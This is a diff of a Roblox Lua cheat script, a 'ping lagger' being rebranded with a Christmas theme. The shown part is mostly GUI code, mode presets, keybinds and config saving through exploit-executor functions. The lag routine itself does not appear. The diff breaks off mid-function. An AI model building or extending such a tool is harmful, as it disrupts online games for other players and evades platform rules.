@@ -1,1589 +1,1152 @@
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local plr = Players.LocalPlayer
-local plrGui = plr:WaitForChild("PlayerGui")
+--[[
+    ʟᴜᴄᴋ.ᴄʀɪꜱꜱᴍᴀꜱ PING LAGGER
+    Tema Navidad · Rojo & Verde · Luces en los bordes
+    - LOW / MED / HIGH
+    - Keybind teclado + mando
+    - Auto-save (LuckCrissmasPing.json)
+    - Auto Brainrot Detection
+]]
 
-local CONFIG_FILE = "mustpinglagger.json"
-local DEFAULT_CFG = {
-    power        = 100000,
-    power1       = 100000,
-    power2       = 75000,
-    interval1     = 0.13,
-    interval2     = 0.125,
-    activePower  = 1,
-    interval     = 0.13,
-    keybindKb    = "F",
-    keybindGp    = "ButtonR2",
-    autoBrainrot = true,
-}
-local savedUi = {}
-local bgIndex = 1
-local colorIndex = 1
-local customStroke = nil
-local captureUiState
-
-local cfg = {
-    power        = DEFAULT_CFG.power,
-    power1       = DEFAULT_CFG.power1,
-    power2       = DEFAULT_CFG.power2,
-    interval1     = DEFAULT_CFG.interval1,
-    interval2     = DEFAULT_CFG.interval2,
-    activePower  = DEFAULT_CFG.activePower,
-    interval     = DEFAULT_CFG.interval,
-    keybindKb    = DEFAULT_CFG.keybindKb,
-    keybindGp    = DEFAULT_CFG.keybindGp,
-    autoBrainrot = DEFAULT_CFG.autoBrainrot,
-}
-
-local function resolveKb(name)
-    if not name or name == "" or name == "None" then return nil end
-    local ok, val = pcall(function() return Enum.KeyCode[name] end)
-    return (ok and val) or nil
-end
-
-local function saveConfig()
-    if captureUiState then captureUiState() end
-    local data = {}
-    for k, v in pairs(cfg) do data[k] = v end
-    data.ui = savedUi
-    local ok, encoded = pcall(function() return HttpService:JSONEncode(data) end)
-    if ok and encoded and writefile then
-        pcall(writefile, CONFIG_FILE, encoded)
+local _MVPPingLaggerScreen = nil
+function openMVPPingLagger()
+    if _MVPPingLaggerScreen and _MVPPingLaggerScreen.Parent then
+        local existingMain = _MVPPingLaggerScreen:FindFirstChild("MainFrame")
+        if existingMain then existingMain.Visible = true end
+        return _MVPPingLaggerScreen
     end
-end
+    -- Galaxy Ping Lagger integrado en MVP
+    -- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection | Modos LOW/MED/HIGH
 
-local function loadConfig()
-    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
-    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
-    if not ok or type(data) ~= "table" then return end
-    savedUi = type(data.ui) == "table" and data.ui or {}
-    cfg.power1       = tonumber(data.power1) or tonumber(data.power) or DEFAULT_CFG.power1
-    cfg.power2       = tonumber(data.power2) or DEFAULT_CFG.power2
-    cfg.interval1    = tonumber(data.interval1) or DEFAULT_CFG.interval1
-    cfg.interval2    = tonumber(data.interval2) or DEFAULT_CFG.interval2
-    cfg.activePower  = (tonumber(data.activePower) == 2) and 2 or 1
-    cfg.power        = cfg.activePower == 2 and cfg.power2 or cfg.power1
-    cfg.interval     = cfg.activePower == 2 and cfg.interval2 or cfg.interval1
-    cfg.keybindKb    = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
-    cfg.keybindGp    = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
-    cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
-end
+    local UserInputService = game:GetService("UserInputService")
+    local TweenService     = game:GetService("TweenService")
+    local HttpService      = game:GetService("HttpService")
+    local Players          = game:GetService("Players")
+    local RunService       = game:GetService("RunService")
 
-loadConfig()
+    local plr              = Players.LocalPlayer
+    local plrGui           = plr:WaitForChild("PlayerGui")
 
-local active = false
-local activePowerButton, backupPowerButton, profileLabel
-local primaryLed, backupLed
-local refreshPowerRows
-local listeningFor = nil
-local remote = nil
-local brainrotMode = false
-local lastBrainrotState = false
-local manualOverride = false
-local pingLoopRunning = false
-local applyAccentColors
+    -- ══════════════════════════════════════════════════════════════════════
+    -- CONFIG & SAVE
+    -- ══════════════════════════════════════════════════════════════════════
+    local CONFIG_FILE = "LuckCrissmasPing.json"
 
-local PHOTO1_ACCENT = Color3.fromRGB(220, 220, 220)
-local PHOTO2_ACCENT = Color3.fromRGB(220, 220, 220)
-local BG_LIST = {
-    { name = "MUST", id = "rbxassetid://109740377478030", accent = Color3.fromRGB(220, 220, 220), text = Color3.fromRGB(255,255,255), stroke = Color3.fromRGB(220, 220, 220) },
-}
-local COLOR_OPTIONS = {
-    Color3.fromRGB(255, 35, 35), Color3.fromRGB(255, 80, 35), Color3.fromRGB(255, 145, 25),
-    Color3.fromRGB(255, 220, 35), Color3.fromRGB(150, 235, 35), Color3.fromRGB(40, 220, 90),
-    Color3.fromRGB(0, 190, 130), Color3.fromRGB(30, 210, 235), Color3.fromRGB(40, 150, 255),
-    Color3.fromRGB(80, 100, 255), Color3.fromRGB(135, 75, 255), Color3.fromRGB(195, 70, 255),
-    Color3.fromRGB(255, 60, 185), Color3.fromRGB(255, 90, 130), Color3.fromRGB(255, 255, 255),
-    Color3.fromRGB(120, 130, 140),
-}
-local function getEntry()
-    local i = tonumber(bgIndex) or 1
-    if i < 1 then i = 1 end
-    if i > #BG_LIST then i = #BG_LIST end
-    return BG_LIST[i]
-end
-local function getBgId()    return getEntry().id end
-local function getBgName()  return getEntry().name end
-local function getAccent()  return getEntry().accent end
-local function getText()    return getEntry().text end
-local function getStroke()  return customStroke or getEntry().stroke end
+    local DEFAULT_CFG = {
+        power         = 100000,
+        interval      = 0.125,
+        keybindKb     = "F",
+        keybindGp     = "ButtonR2",
+        autoBrainrot  = true,
+        mode          = "LOW",
+    }
 
-for _, kid in pairs(plrGui:GetChildren()) do
-    if kid.Name == "MustPingLaggerGui" or kid.Name == "CypherIntro" then
-        kid:Destroy()
+    local MODES = {
+        LOW  = { power = 100000, interval = 0.125  },
+        MED  = { power = 100000, interval = 0.12   },
+        HIGH = { power = 100000, interval = 0.0125 },
+    }
+
+    local cfg = {
+        power         = DEFAULT_CFG.power,
+        interval      = DEFAULT_CFG.interval,
+        keybindKb     = DEFAULT_CFG.keybindKb,
+        keybindGp     = DEFAULT_CFG.keybindGp,
+        autoBrainrot  = DEFAULT_CFG.autoBrainrot,
+        mode          = DEFAULT_CFG.mode,
+    }
+
+    local function resolveKb(name)
+        if not name or name == "" or name == "None" then return nil end
+        local ok, val = pcall(function() return Enum.KeyCode[name] end)
+        return (ok and val) or nil
     end
-end
 
-local function tw(obj, props, t)
-    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
-end
-
-local function makeDraggable(frame, lockFlag)
-    local dragging, dragStart, startPos
-    frame.InputBegan:Connect(function(i)
-        if lockFlag and lockFlag() then return end
-        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = i.Position
-            startPos = frame.Position
-            i.Changed:Connect(function()
-                if i.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                    if captureUiState then captureUiState(); saveConfig() end
-                end
-            end)
-        end
-    end)
-    frame.InputChanged:Connect(function(i)
-        if lockFlag and lockFlag() then dragging = false; return end
-        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
-            local d = i.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
-        end
-    end)
-end
-
-local function isGamepadKeyCode(kc)
-    if not kc then return false end
-    local name = kc.Name
-    return name:find("Button") == 1 or name == "DPadUp" or name == "DPadDown" or name == "DPadLeft" or
-        name == "DPadRight" or name == "ButtonSelect" or name == "ButtonStart" or name == "Thumbstick1" or name == "Thumbstick2"
-end
-
-local BLACKLISTED = {[Enum.KeyCode.Escape] = true, [Enum.KeyCode.LeftControl] = true, [Enum.KeyCode.Unknown] = true}
-
-local WHITE = Color3.fromRGB(255,255,255)
-local GREEN = Color3.fromRGB(0,220,110)
-local RED = Color3.fromRGB(255,110,130)
-local BRIGHT_RED = Color3.fromRGB(255, 0, 0)
-local TOGGLE_OFF = Color3.fromRGB(40,40,40)
-local TOGGLE_KNOB = Color3.fromRGB(240,240,240)
-
-local screen = Instance.new("ScreenGui")
-screen.Name = "MustPingLaggerGui"
-screen.ResetOnSpawn = false
-screen.DisplayOrder = 18
-screen.IgnoreGuiInset = true
-local okParent = false
-if gethui then okParent = pcall(function() screen.Parent = gethui() end) end
-if not okParent then
-    pcall(function() screen.Parent = plrGui end)
-end
-
-local uiLocked = false
-local pingMinimized = false
-
-local SCALE = 0.48
-local MAIN_W = math.floor(420 * SCALE)
-local MAIN_H = math.floor(110 * SCALE)
-local MIN_HEIGHT = 28
-
-local accent0 = getAccent()
-local text0 = getText()
-local stroke0 = getStroke()
-local accentDim0 = accent0:Lerp(Color3.new(0,0,0), 0.4)
-local rowBg0 = Color3.new(accent0.R*0.2, accent0.G*0.2, accent0.B*0.2)
-local rowBoxBg0 = Color3.new(accent0.R*0.15, accent0.G*0.15, accent0.B*0.15)
-local tabAct0 = Color3.new(accent0.R*0.3, accent0.G*0.3, accent0.B*0.3)
-local tabInact0 = Color3.new(accent0.R*0.1, accent0.G*0.1, accent0.B*0.1)
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "CypherMain"
-mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
-mainFrame.Position = UDim2.new(0.5, -MAIN_W/2, 0.22, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
-mainFrame.BackgroundTransparency = 1
-mainFrame.BorderSizePixel = 0
-mainFrame.Active = true
-mainFrame.ClipsDescendants = true
-mainFrame.Parent = screen
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 18)
-local mainStroke = Instance.new("UIStroke", mainFrame)
-mainStroke.Color = stroke0
-mainStroke.Thickness = 1.5
-mainStroke.Transparency = 0.2
-makeDraggable(mainFrame, function() return uiLocked end)
-
-local mainBgImage = Instance.new("ImageLabel", mainFrame)
-mainBgImage.Name = "MainBgImage"
-mainBgImage.Size = UDim2.new(1,0,1,0)
-mainBgImage.BackgroundTransparency = 1
-mainBgImage.Image = getBgId()
-mainBgImage.ScaleType = Enum.ScaleType.Crop
-mainBgImage.ZIndex = 1
-Instance.new("UICorner", mainBgImage).CornerRadius = UDim.new(0, 18)
-
-local darkOverlay = Instance.new("Frame", mainFrame)
-darkOverlay.Size = UDim2.new(1,0,1,0)
-darkOverlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
-darkOverlay.BackgroundTransparency = 0.55
-darkOverlay.BorderSizePixel = 0
-darkOverlay.ZIndex = 2
-Instance.new("UICorner", darkOverlay).CornerRadius = UDim.new(0, 18)
-
-local header = Instance.new("Frame", mainFrame)
-header.Size = UDim2.new(1,0,0,28)
-header.BackgroundTransparency = 1
-header.BorderSizePixel = 0
-header.ZIndex = 3
-
-local titleLbl = Instance.new("TextLabel", header)
-titleLbl.Size = UDim2.new(0, 195, 1, 0)
-titleLbl.Position = UDim2.new(0, 8, 0, 0)
-titleLbl.BackgroundTransparency = 1
-titleLbl.Text = "MUST PING LAGGER"
-titleLbl.TextColor3 = stroke0
-titleLbl.Font = Enum.Font.GothamBlack
-titleLbl.TextSize = 13
-titleLbl.TextXAlignment = Enum.TextXAlignment.Left
-titleLbl.TextStrokeTransparency = 0.3
-titleLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
-titleLbl.ZIndex = 4
-
-local btnContainer = Instance.new("Frame", header)
-btnContainer.Size = UDim2.new(0, 62, 0, 20)
-btnContainer.Position = UDim2.new(1, -68, 0.5, -10)
-btnContainer.BackgroundTransparency = 1
-btnContainer.ZIndex = 4
-local btnLayout = Instance.new("UIListLayout", btnContainer)
-btnLayout.FillDirection = Enum.FillDirection.Horizontal
-btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
-btnLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-btnLayout.Padding = UDim.new(0, 3)
-btnLayout.SortOrder = Enum.SortOrder.LayoutOrder
-
-local function addStroke(obj, thickness, transparency)
-    local s = Instance.new("UIStroke", obj)
-    s.Color = stroke0
-    s.Thickness = thickness or 1
-    s.Transparency = transparency or 0.3
-    return s
-end
-
-local function mkHeaderBtn(text, order, size, textSize)
-    local btn = Instance.new("TextButton", btnContainer)
-    btn.Size = UDim2.new(0, size or 18, 0, size or 18)
-    btn.BackgroundColor3 = rowBg0
-    btn.BorderSizePixel = 0
-    btn.Text = text
-    btn.TextColor3 = text0
-    btn.Font = Enum.Font.GothamBlack
-    btn.TextSize = textSize or 9
-    btn.ZIndex = 5
-    btn.AutoButtonColor = false
-    btn.LayoutOrder = order
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
-    addStroke(btn)
-    return btn
-end
-
-local lockBtn = mkHeaderBtn("🔓", 1, 18, 9)
-local minimizeBtn = mkHeaderBtn("—", 2, 18, 11)
-local gearBtn = mkHeaderBtn("⚙", 3, 18, 10)
-
-local statusPill = Instance.new("Frame", header)
-statusPill.Name = "statusPill"
-statusPill.Size = UDim2.new(0, 48, 0, 16)
-statusPill.Position = UDim2.new(1, -122, 0.5, -8)
-statusPill.BackgroundColor3 = Color3.fromRGB(50,20,40)
-statusPill.BorderSizePixel = 0
-statusPill.ZIndex = 4
-Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
-local statusLbl = Instance.new("TextLabel", statusPill)
-statusLbl.Name = "statusLbl"
-statusLbl.Size = UDim2.new(1,0,1,0)
-statusLbl.BackgroundTransparency = 1
-statusLbl.Text = "OFF"
-statusLbl.TextColor3 = RED
-statusLbl.Font = Enum.Font.GothamBlack
-statusLbl.TextSize = 8
-statusLbl.ZIndex = 5
-
-local mainContent = Instance.new("Frame", mainFrame)
-mainContent.Name = "MainContent"
-mainContent.Size = UDim2.new(1,0,1,-28)
-mainContent.Position = UDim2.new(0,0,0,28)
-mainContent.BackgroundTransparency = 1
-mainContent.BorderSizePixel = 0
-mainContent.ZIndex = 3
-
-local activateBtn = Instance.new("TextButton", mainContent)
-activateBtn.Name = "activateBtn"
-activateBtn.Size = UDim2.new(1,-10,0,27)
-activateBtn.Position = UDim2.new(0,5,0,5)
-activateBtn.BackgroundColor3 = rowBg0
-activateBtn.BackgroundTransparency = 0.15
-activateBtn.BorderSizePixel = 0
-activateBtn.Text = ""
-activateBtn.AutoButtonColor = false
-activateBtn.ZIndex = 4
-Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 12)
-local ag = Instance.new("UIGradient", activateBtn)
-ag.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, accentDim0),
-    ColorSequenceKeypoint.new(1, accent0)
-})
-ag.Rotation = 120
-ag.Transparency = NumberSequence.new({
-    NumberSequenceKeypoint.new(0, 0.4),
-    NumberSequenceKeypoint.new(1, 0.4)
-})
-local aStroke = Instance.new("UIStroke", activateBtn)
-aStroke.Color = stroke0
-aStroke.Thickness = 1.2
-aStroke.Transparency = 0.4
-local activateLbl = Instance.new("TextLabel", activateBtn)
-activateLbl.Size = UDim2.new(1,0,1,0)
-activateLbl.BackgroundTransparency = 1
-activateLbl.Text = "PING LAGGER"
-activateLbl.TextColor3 = text0
-activateLbl.Font = Enum.Font.GothamBlack
-activateLbl.TextSize = 10
-activateLbl.ZIndex = 5
-
-local function updateToggleButton()
-    if refreshPowerRows then refreshPowerRows() end
-    if active then
-        activateLbl.Text = "▶ PING LAGGER"
-        aStroke.Transparency = 0.1
-        ag.Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, GREEN),
-            ColorSequenceKeypoint.new(1, GREEN:Lerp(Color3.new(0,0,0), 0.3))
-        })
-        statusLbl.Text = "ON"
-        statusLbl.TextColor3 = GREEN
-        statusPill.BackgroundColor3 = Color3.fromRGB(20,50,35)
-    else
-        activateLbl.Text = "PING LAGGER"
-        aStroke.Transparency = 0.4
-        local acc = getAccent()
-        local accDim = acc:Lerp(Color3.new(0,0,0), 0.4)
-        ag.Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, accDim),
-            ColorSequenceKeypoint.new(1, acc)
-        })
-        statusLbl.Text = "OFF"
-        statusLbl.TextColor3 = RED
-        statusPill.BackgroundColor3 = Color3.fromRGB(50,20,40)
-    end
-end
-
-local SET_W, SET_H = 230, 275
-local settingsFrame = Instance.new("Frame")
-settingsFrame.Name = "CypherSettings"
-settingsFrame.Size = UDim2.new(0, SET_W, 0, SET_H)
-settingsFrame.Position = UDim2.new(0.5, -SET_W/2, 0.22, MAIN_H + 12)
-settingsFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
-settingsFrame.BackgroundTransparency = 1
-settingsFrame.BorderSizePixel = 0
-settingsFrame.Active = true
-settingsFrame.ClipsDescendants = true
-settingsFrame.Visible = false
-settingsFrame.ZIndex = 20
-settingsFrame.Parent = screen
-Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 16)
-local ss = Instance.new("UIStroke", settingsFrame)
-ss.Color = stroke0
-ss.Thickness = 1.3
-ss.Transparency = 0.2
-makeDraggable(settingsFrame)
-
-captureUiState = function()
-    local function posOf(obj)
-        return {xs=obj.Position.X.Scale, xo=obj.Position.X.Offset, ys=obj.Position.Y.Scale, yo=obj.Position.Y.Offset}
-    end
-    savedUi.bgIndex = bgIndex
-    savedUi.colorIndex = colorIndex
-    if customStroke then savedUi.customStroke = {customStroke.R, customStroke.G, customStroke.B} else savedUi.customStroke = nil end
-    savedUi.mainPos = posOf(mainFrame)
-    savedUi.settingsPos = posOf(settingsFrame)
-end
-
-local function restorePos(obj, value)
-    if type(value) == "table" then
-        obj.Position = UDim2.new(tonumber(value.xs) or obj.Position.X.Scale, tonumber(value.xo) or obj.Position.X.Offset, tonumber(value.ys) or obj.Position.Y.Scale, tonumber(value.yo) or obj.Position.Y.Offset)
-    end
-end
-restorePos(mainFrame, savedUi.mainPos)
-restorePos(settingsFrame, savedUi.settingsPos)
-
-local settingsBgImage = Instance.new("ImageLabel", settingsFrame)
-settingsBgImage.Name = "SettingsBgImage"
-settingsBgImage.Size = UDim2.new(1,0,1,0)
-settingsBgImage.BackgroundTransparency = 1
-settingsBgImage.Image = getBgId()
-settingsBgImage.ScaleType = Enum.ScaleType.Crop
-settingsBgImage.ZIndex = 1
-Instance.new("UICorner", settingsBgImage).CornerRadius = UDim.new(0, 16)
-
-local settingsOverlay = Instance.new("Frame", settingsFrame)
-settingsOverlay.Size = UDim2.new(1,0,1,0)
-settingsOverlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
-settingsOverlay.BackgroundTransparency = 0.55
-settingsOverlay.BorderSizePixel = 0
-settingsOverlay.ZIndex = 2
-Instance.new("UICorner", settingsOverlay).CornerRadius = UDim.new(0, 16)
-
-local setHeader = Instance.new("Frame", settingsFrame)
-setHeader.Size = UDim2.new(1,0,0,22)
-setHeader.BackgroundTransparency = 1
-setHeader.BorderSizePixel = 0
-setHeader.ZIndex = 21
-local setTitle = Instance.new("TextLabel", setHeader)
-setTitle.Size = UDim2.new(1,-30,1,0)
-setTitle.Position = UDim2.new(0,8,0,0)
-setTitle.BackgroundTransparency = 1
-setTitle.Text = "MUST PING LAGGER SETTINGS"
-setTitle.TextColor3 = stroke0
-setTitle.Font = Enum.Font.GothamBlack
-setTitle.TextSize = 8
-setTitle.TextXAlignment = Enum.TextXAlignment.Left
-setTitle.TextStrokeTransparency = 0.35
-setTitle.TextStrokeColor3 = Color3.fromRGB(0,0,0)
-setTitle.ZIndex = 22
-local setCloseBtn = Instance.new("TextButton", setHeader)
-setCloseBtn.Name = "setCloseBtn"
-setCloseBtn.Size = UDim2.new(0,16,0,16)
-setCloseBtn.Position = UDim2.new(1,-20,0.5,-8)
-setCloseBtn.BackgroundColor3 = rowBg0
-setCloseBtn.Text = "X"
-setCloseBtn.TextColor3 = text0
-setCloseBtn.Font = Enum.Font.GothamBlack
-setCloseBtn.TextSize = 9
-setCloseBtn.ZIndex = 23
-setCloseBtn.BorderSizePixel = 0
-Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0, 4)
-addStroke(setCloseBtn)
-setCloseBtn.MouseButton1Click:Connect(function()
-    settingsFrame.Visible = false
-end)
-
-local tabBar = Instance.new("Frame", settingsFrame)
-tabBar.Size = UDim2.new(1,-12,0,20)
-tabBar.Position = UDim2.new(0,6,0,24)
-tabBar.BackgroundTransparency = 1
-tabBar.ZIndex = 21
-local tabLayout = Instance.new("UIListLayout", tabBar)
-tabLayout.FillDirection = Enum.FillDirection.Horizontal
-tabLayout.Padding = UDim.new(0, 4)
-tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
-
-local function mkTab(text, order)
-    local btn = Instance.new("TextButton", tabBar)
-    btn.Size = UDim2.new(0, 68, 0, 20)
-    btn.BackgroundColor3 = tabInact0
-    btn.BorderSizePixel = 0
-    btn.Text = text
-    btn.TextColor3 = text0
-    btn.Font = Enum.Font.GothamBlack
-    btn.TextSize = 9
-    btn.AutoButtonColor = false
-    btn.LayoutOrder = order
-    btn.ZIndex = 22
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
-    addStroke(btn)
-    return btn
-end
-
-local tabPower = mkTab("POWER", 1)
-local tabSettings = mkTab("SETTINGS", 2)
-local tabConfig = mkTab("CONFI", 3)
-
-local pagesFrame = Instance.new("Frame", settingsFrame)
-pagesFrame.Size = UDim2.new(1,-12,1,-78)
-pagesFrame.Position = UDim2.new(0,6,0,48)
-pagesFrame.BackgroundTransparency = 1
-pagesFrame.ZIndex = 21
-
-local powerPage = Instance.new("Frame", pagesFrame)
-powerPage.Size = UDim2.new(1,0,1,0)
-powerPage.BackgroundTransparency = 1
-powerPage.ZIndex = 21
-powerPage.Visible = true
-
-local settingsPage = Instance.new("Frame", pagesFrame)
-settingsPage.Size = UDim2.new(1,0,1,0)
-settingsPage.BackgroundTransparency = 1
-settingsPage.ZIndex = 21
-settingsPage.Visible = false
-
-local configPage = Instance.new("Frame", pagesFrame)
-configPage.Name = "ConfigPage"
-configPage.Size = UDim2.new(1,0,1,0)
-configPage.BackgroundTransparency = 1
-configPage.ZIndex = 21
-configPage.Visible = false
-
-local function selectTab(which)
-    local accent = getAccent()
-    local textC = getText()
-    local strokeC = getStroke()
-    local accAct = Color3.new(accent.R*0.3, accent.G*0.3, accent.B*0.3)
-    local accInact = Color3.new(accent.R*0.1, accent.G*0.1, accent.B*0.1)
-    powerPage.Visible = which == "power"
-    settingsPage.Visible = which == "settings"
-    configPage.Visible = which == "config"
-    tabPower.BackgroundColor3 = which == "power" and accAct or accInact
-    tabSettings.BackgroundColor3 = which == "settings" and accAct or accInact
-    tabConfig.BackgroundColor3 = which == "config" and accAct or accInact
-    tabPower.TextColor3 = which == "power" and strokeC or textC
-    tabSettings.TextColor3 = which == "settings" and strokeC or textC
-    tabConfig.TextColor3 = which == "config" and strokeC or textC
-end
-
-local function mkRow(parent, y, label, valueText)
-    local row = Instance.new("Frame", parent)
-    row.Size = UDim2.new(1,0,0,25)
-    row.Position = UDim2.new(0,0,0,y)
-    row.BackgroundColor3 = rowBg0
-    row.BackgroundTransparency = 0.3
-    row.BorderSizePixel = 0
-    row.ZIndex = 22
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
-    local lbl = Instance.new("TextLabel", row)
-    lbl.Size = UDim2.new(0.5,0,1,0)
-    lbl.Position = UDim2.new(0,8,0,0)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = label
-    lbl.TextColor3 = text0
-    lbl.Font = Enum.Font.GothamBold
-    lbl.TextSize = 9
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.ZIndex = 23
-    local box = Instance.new("TextBox", row)
-    box.Size = UDim2.new(0,84,0,18)
-    box.Position = UDim2.new(1,-92,0.5,-9)
-    box.BackgroundColor3 = rowBoxBg0
-    box.BackgroundTransparency = 0.25
-    box.BorderSizePixel = 0
-    box.Text = valueText
-    box.TextColor3 = stroke0
-    box.Font = Enum.Font.GothamBold
-    box.TextSize = 9
-    box.ClearTextOnFocus = false
-    box.ZIndex = 24
-    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
-    addStroke(box, 1, 0.3)
-    return box
-end
-
-local powerBox = mkRow(powerPage, 2, "POTENCIA 1", tostring(cfg.power1))
-local delayBox1 = mkRow(powerPage, 31, "SEGUNDOS 1", tostring(cfg.interval1))
-local backupPowerBox = mkRow(powerPage, 89, "POTENCIA 2", tostring(cfg.power2))
-local delayBox2 = mkRow(powerPage, 118, "SEGUNDOS 2", tostring(cfg.interval2))
-refreshPowerRows = function()
-    local p1On = active and cfg.activePower == 1
-    local p2On = active and cfg.activePower == 2
-    local onColor = Color3.fromRGB(0, 190, 75)
-    local offColor = rowBg0
-    local p1Row, s1Row = powerBox.Parent, delayBox1.Parent
-    local p2Row, s2Row = backupPowerBox.Parent, delayBox2.Parent
-    p1Row.BackgroundColor3 = p1On and onColor or offColor
-    s1Row.BackgroundColor3 = p1On and onColor or offColor
-    p2Row.BackgroundColor3 = p2On and onColor or offColor
-    s2Row.BackgroundColor3 = p2On and onColor or offColor
-    powerBox.TextColor3 = p1On and Color3.fromRGB(0,0,0) or getStroke()
-    delayBox1.TextColor3 = p1On and Color3.fromRGB(0,0,0) or getStroke()
-    backupPowerBox.TextColor3 = p2On and Color3.fromRGB(0,0,0) or getStroke()
-    delayBox2.TextColor3 = p2On and Color3.fromRGB(0,0,0) or getStroke()
-end
-local function refreshPowerProfile()
-    if cfg.activePower == 2 then
-        cfg.power = cfg.power2
-        cfg.interval = cfg.interval2
-    else
-        cfg.power = cfg.power1
-        cfg.interval = cfg.interval1
-    end
-    powerBox.Text = tostring(cfg.power1)
-    delayBox1.Text = tostring(cfg.interval1)
-    backupPowerBox.Text = tostring(cfg.power2)
-    delayBox2.Text = tostring(cfg.interval2)
-    if refreshPowerRows then refreshPowerRows() end
-    if activePowerButton and backupPowerButton then
-        local activeColor = getAccent()
-        local isPrimary = cfg.activePower == 1
-        activePowerButton.BackgroundColor3 = isPrimary and activeColor or rowBoxBg0
-        backupPowerButton.BackgroundColor3 = (not isPrimary) and activeColor or rowBoxBg0
-        activePowerButton.TextColor3 = isPrimary and Color3.fromRGB(0,0,0) or getStroke()
-        backupPowerButton.TextColor3 = (not isPrimary) and Color3.fromRGB(0,0,0) or getStroke()
-        activePowerButton.Text = isPrimary and "✓ PRINCIPAL" or "PRINCIPAL"
-        backupPowerButton.Text = (not isPrimary) and "✓ RESPALDO" or "RESPALDO"
-        if primaryLed then primaryLed.BackgroundColor3 = isPrimary and Color3.fromRGB(0,255,100) or Color3.fromRGB(70,70,70) end
-        if backupLed then backupLed.BackgroundColor3 = (not isPrimary) and Color3.fromRGB(0,255,100) or Color3.fromRGB(70,70,70) end
-        if profileLabel then profileLabel.Text = isPrimary and "USAR: P1" or "USAR: P2" end
-    end
-end
-powerBox.FocusLost:Connect(function()
-    local n = tonumber(powerBox.Text)
-    cfg.power1 = n and math.max(1, n) or DEFAULT_CFG.power1
-    refreshPowerProfile()
-    saveConfig()
-end)
-delayBox1.FocusLost:Connect(function()
-    local n = tonumber(delayBox1.Text)
-    cfg.interval1 = n and math.max(0.001, n) or DEFAULT_CFG.interval1
-    refreshPowerProfile()
-    saveConfig()
-end)
-backupPowerBox.FocusLost:Connect(function()
-    local n = tonumber(backupPowerBox.Text)
-    cfg.power2 = n and math.max(1, n) or DEFAULT_CFG.power2
-    refreshPowerProfile()
-    saveConfig()
-end)
-delayBox2.FocusLost:Connect(function()
-    local n = tonumber(delayBox2.Text)
-    cfg.interval2 = n and math.max(0.001, n) or DEFAULT_CFG.interval2
-    refreshPowerProfile()
-    saveConfig()
-end)
-local profileRow = Instance.new("Frame", powerPage)
-profileRow.Name = "PowerProfileRow"
-profileRow.Size = UDim2.new(1,0,0,25)
-profileRow.Position = UDim2.new(0,0,0,60)
-profileRow.BackgroundColor3 = rowBg0
-profileRow.BackgroundTransparency = 0.3
-profileRow.BorderSizePixel = 0
-profileRow.ZIndex = 22
-Instance.new("UICorner", profileRow).CornerRadius = UDim.new(0,5)
-profileLabel = Instance.new("TextLabel", profileRow)
-profileLabel.Size = UDim2.new(0,82,1,0)
-profileLabel.Position = UDim2.new(0,8,0,0)
-profileLabel.BackgroundTransparency = 1
-profileLabel.Text = "USAR"
-profileLabel.TextColor3 = text0
-profileLabel.Font = Enum.Font.GothamBold
-profileLabel.TextSize = 9
-profileLabel.TextXAlignment = Enum.TextXAlignment.Left
-profileLabel.ZIndex = 23
-local function profileButton(text, x)
-    local b = Instance.new("TextButton", profileRow)
-    b.Size = UDim2.new(0,56,0,18)
-    b.Position = UDim2.new(0,x,0.5,-9)
-    b.BackgroundColor3 = rowBoxBg0
-    b.BorderSizePixel = 0
-    b.Text = text
-    b.TextColor3 = stroke0
-    b.Font = Enum.Font.GothamBold
-    b.TextSize = 8
-    b.AutoButtonColor = false
-    b.ZIndex = 24
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
-    addStroke(b,1,0.3)
-    return b
-end
-activePowerButton = profileButton("PRINCIPAL", 82)
-backupPowerButton = profileButton("RESPALDO", 142)
-local function makePowerLed(button)
-    local led = Instance.new("Frame", button)
-    led.Name = "ActiveLed"
-    led.Size = UDim2.new(0,6,0,6)
-    led.Position = UDim2.new(0,3,0.5,-3)
-    led.BackgroundColor3 = Color3.fromRGB(70,70,70)
